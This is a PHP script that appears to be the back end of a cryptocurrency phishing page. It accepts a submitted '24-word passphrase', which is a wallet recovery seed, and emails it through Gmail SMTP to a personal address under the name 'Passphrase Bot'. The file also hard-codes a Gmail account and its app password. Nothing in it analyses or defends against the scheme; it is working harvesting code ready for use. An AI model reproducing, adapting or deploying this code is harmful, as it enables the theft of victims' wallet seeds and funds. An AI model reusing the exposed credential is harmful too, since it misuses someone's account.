<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/PHPMailer.php';
require 'phpmailer/SMTP.php';
require 'phpmailer/Exception.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['passphrase'])) {
    $passphrase = trim($_POST['passphrase']);

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'vibesbundle@gmail.com'; // Your Gmail
        $mail->Password = 'dcwhvilupbnvshnz'; // App password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        // Recipients
        $mail->setFrom('vibesbundle@gmail.com', 'Passphrase Bot');
        $mail->addAddress('Ahamefulechibuzor@gmail.com', 'Chibuzor');

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New 24-word Passphrase Submitted';
        $mail->Body    = "<h2>Passphrase Received:</h2><p style='font-family:monospace;'>{$passphrase}</p>";
        $mail->AltBody = "Passphrase: {$passphrase}";

        $mail->send();
        echo "success";
    } catch (Exception $e) {
        http_response_code(500);
        echo "Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    http_response_code(400);
    echo "Invalid request.";
}